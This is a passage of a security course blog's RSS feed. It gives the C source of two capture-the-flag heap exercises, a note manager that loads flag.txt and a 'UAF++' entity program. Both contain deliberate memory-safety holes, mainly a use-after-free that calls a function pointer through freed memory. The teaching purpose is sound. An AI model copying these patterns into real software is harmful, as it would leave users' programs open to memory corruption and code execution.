&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Add done&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">read_note&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Note[%d]:&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, idx);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	write(&lt;span style="color:#ae81ff">1&lt;/span>, notes[idx].content, notes[idx].len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">write_note&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Content: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, notes[idx].content, notes[idx].len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">delete_note&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	free(notes[idx].content);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Delete done&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">memu&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;1. add note&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;2. read note&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;3. write note&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;4. delete note&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;choice: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;./flag.txt&amp;#34;&lt;/span>, O_RDONLY);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	notes[&lt;span style="color:#ae81ff">0&lt;/span>].len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x30&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	notes[&lt;span style="color:#ae81ff">0&lt;/span>].content &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x30&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(fd, notes[&lt;span style="color:#ae81ff">0&lt;/span>].content, &lt;span style="color:#ae81ff">0x30&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	close(fd);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (;;)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		memu();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">int&lt;/span> choice &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">switch&lt;/span> (choice)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			add_note();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			read_note();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			write_note();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			delete_note();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			puts(&lt;span style="color:#e6db74">&amp;#34;Invalid command&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x40(2023 HW - UAF++)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x402023-hw---uaf++/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x402023-hw---uaf++/</guid><description>&lt;h1 id="simple-pwn-0x402023-hw---uaf">
 Simple PWN 0x40(2023 HW - UAF++)
 &lt;a class="anchor" href="#simple-pwn-0x402023-hw---uaf">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/SJWc9v4Bp">0x34(2023 Lab - UAF):three:&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">default_handle&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>event)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;EVENT: get event named &lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, event);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>name;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>event;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>event_handle)(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span> &lt;span style="color:#f92672">*&lt;/span>entities[&lt;span style="color:#ae81ff">0x2&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">read_int&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x1f&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> atoi(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">get_idx&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (idx &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0x2&lt;/span> &lt;span style="color:#f92672">||&lt;/span> idx &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">memu&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;1. register entity&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;2. delete entity&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;3. trigger event&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;choice: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">register_entity&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx] &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Default Event&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event_handle &lt;span style="color:#f92672">=&lt;/span> default_handle;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Nmae Length: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	len &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (len &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> len &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x430&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name &lt;span style="color:#f92672">=&lt;/span> malloc(len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Name: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name, len &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">delete_entity&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		free(entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		free(entities[idx]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Invalid index&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">trigger_event&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printf(&lt;span style="color:#e6db74">&amp;#34;Name: %s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event_handle(entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (;;)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		memu();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">int&lt;/span> choice &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">switch&lt;/span> (choice)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			register_entity();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			delete_entity();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			trigger_event();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			puts(&lt;span style="color:#e6db74">&amp;#34;Invalid command&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item></channel></rss>